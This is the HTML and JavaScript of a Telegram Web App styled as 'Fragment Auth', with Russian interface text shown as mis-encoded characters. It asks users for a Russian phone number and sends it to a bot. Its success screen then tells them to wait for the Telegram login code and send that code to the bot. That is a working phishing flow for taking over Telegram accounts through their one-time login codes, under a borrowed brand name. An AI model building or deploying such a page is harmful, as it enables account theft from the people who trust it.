<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; width: 100%; max-width: 380px; }
        .header { background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%); color: white; padding: 30px 25px; text-align: center; }
        .header h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        .content { padding: 30px 25px; }
        .step { display: none; }
        .step.active { display: block; }
        .input-group { margin-bottom: 20px; }
        .input-label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
        .phone-input { display: flex; gap: 10px; align-items: center; }
        .country-code { background: #f8f9fa; border: 2px solid #e9ecef; border-radius: 12px; padding: 15px; min-width: 80px; text-align: center; font-weight: 600; color: #495057; }
        .phone-field { flex: 1; padding: 15px; border: 2px solid #e9ecef; border-radius: 12px; font-size: 16px; transition: all 0.3s ease; }
        .phone-field:focus { outline: none; border-color: #0088cc; box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1); }
        .btn { flex: 1; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
        .btn-next { background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%); color: white; box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
        .btn-next:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4); }
        .instructions { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #6c757d; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Fragment Auth</h1>
            <p>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Telegram</p>
        </div>

        <div class="content">
            <div id="stepPhone" class="step active">
                <div class="instructions">
                    –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤ Telegram
                </div>

                <div class="input-group">
                    <label class="input-label">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                    <div class="phone-input">
                        <div class="country-code">+7</div>
                        <input type="tel" id="phone" class="phone-field" placeholder="9123456789" maxlength="10">
                    </div>
                </div>

                <div class="buttons">
                    <button class="btn btn-next" onclick="sendPhone()">–û–¢–ü–†–ê–í–ò–¢–¨ –ù–û–ú–ï–†</button>
                </div>
            </div>

            <div id="stepSuccess" class="step">
                <div class="instructions">
                    ‚úÖ <b>–ù–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!</b><br><br>
                    
                    üì± <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –∑–∞–ø—É—â–µ–Ω</b><br><br>
                    
                    –ë–æ—Ç –Ω–∞—á–∞–ª –ø—Ä–æ—Ü–µ—Å—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.<br><br>
                    
                    üì© <b>–ß—Ç–æ –¥–µ–ª–∞—Ç—å –¥–∞–ª—å—à–µ:</b><br>
                    1. –î–æ–∂–¥–∏—Ç–µ—Å—å –∫–æ–¥ –≤ Telegram<br>
                    2. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ —á–∞—Ç —Å –±–æ—Ç–æ–º<br>
                    3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–¥ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: <code>12345</code><br><br>
                    
                    –ó–∞–∫—Ä–æ–π—Ç–µ —ç—Ç–æ –æ–∫–Ω–æ –∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –±–æ—Ç–∞.
                </div>

                <div class="buttons">
                    <button class="btn btn-next" onclick="closeApp()">–ó–ê–ö–†–´–¢–¨</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        let tg = null;
        try {
            tg = window.Telegram.WebApp;
            tg.expand();
            tg.ready();
            console.log("‚úÖ Telegram Web App –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω");
        } catch (error) {
            console.error("‚ùå –û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ Telegram Web App:", error);
        }

        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            document.getElementById(stepId).classList.add('active');
        }

        function closeApp() {
            if (tg) {
                tg.close();
            }
        }

        function sendPhone() {
            const phone = document.getElementById('phone').value.replace(/\D/g, '');
            
            if (!phone || phone.length < 10) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (10 —Ü–∏—Ñ—Ä)');
                return;
            }
            
            const fullPhone = '+7' + phone;
            console.log("üì± –û—Ç–ø—Ä–∞–≤–ª—è—é –Ω–æ–º–µ—Ä:", fullPhone);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
            if (tg && tg.sendData) {
                const data = {
                    action: 'send_phone',
                    phone: fullPhone
                };
                
                try {
                    tg.sendData(JSON.stringify(data));
                    console.log("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ sendData");
                    showStep('stepSuccess');
                } catch (error) {
                    console.error("‚ùå –û—à–∏–±–∫–∞ sendData:", error);
                    sendViaBotAPI(fullPhone);
                }
            } else {
                sendViaBotAPI(fullPhone);
            }
        }

        function sendViaBotAPI(phone) {
            console.log("üîÑ –ò—Å–ø–æ–ª—å–∑—É—é Bot API –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–æ–º–µ—Ä–∞:", phone);
            
            // –°–æ–∑–¥–∞–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –Ω–æ–º–µ—Ä–æ–º
            const message = `üì± –ù–û–ú–ï–† –î–õ–Ø –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò: ${phone}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ –æ–±—ã—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ (–±—É–¥–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –±–æ—Ç–æ–º)
            if (tg && tg.sendData) {
                tg.sendData(JSON.stringify({phone: phone, action: 'send_phone'}));
            }
            
            showStep('stepSuccess');
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤–≤–æ–¥–∞
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendPhone();
        });

        console.log("üöÄ Web App –∑–∞–≥—Ä—É–∂–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ");
    </script>
</body>
</html>